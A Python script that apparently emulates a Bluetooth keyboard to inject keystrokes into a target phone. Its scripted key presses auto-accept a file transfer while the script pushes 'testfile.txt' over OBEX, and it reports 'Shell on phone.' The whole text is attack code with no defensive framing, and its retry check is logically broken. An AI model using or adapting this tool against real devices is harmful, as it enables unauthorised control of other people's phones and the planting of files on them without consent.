#!/usr/bin/python3

import sys
import os
import time
import multiprocessing
from bthid import BluetoothHIDService
from dbus.mainloop.glib import DBusGMainLoop

pcmacaddr = sys.argv[1]
phmacaddr = sys.argv[2]

def macr(send_call_back):

    def home_scr():
        for _ in range(2):
            kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00])
            time.sleep(1)
            send_call_back(bytes(kstate))

    def kbtab():
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))

    def kbreturn():
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))

    def go_back():
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0xF1, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))

    def kbdown():
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x5B, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))

    def kbright():
        kstate = bytearray([0xA1, 0x01, 0x00, 0x00, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))

    def drop_menu():
        kstate = bytearray([0xA1, 0x01, 0x08, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00])
        send_call_back(bytes(kstate))

    def sys_run_push():
        return os.system("bt-obex -p " + phmacaddr + " testfile.txt")

    def push_keys():
        time.sleep(1)
        print ("Accepting file...")
        kbdown()
        kbtab()
        kbright()
        time.sleep(0.5)
        for _ in range(3):
            kbreturn()
            kbdown()
            time.sleep(0.8)
        print("Pushing to phone...")
        time.sleep(1)
        if call_run is None:
            print("Shit, missed.  Retrying...")
            call_run.terminate()
            push_keys()
        else:
            print("Shell on phone.")


    call_run = multiprocessing.Process(target=sys_run_push)
    call_keys = multiprocessing.Process(target=push_keys)
    call_keys.start()
    call_run.start()
    call_keys.join()
    call_run.join()

if __name__ == '__main__':
    DBusGMainLoop(set_as_default=True)
    srec = open("sdp_record_kbd.xml").read()
    try:
        bthid_srv = BluetoothHIDService(srec, pcmacaddr)
        macr(bthid_srv.send)
    finally:
        print("Done")
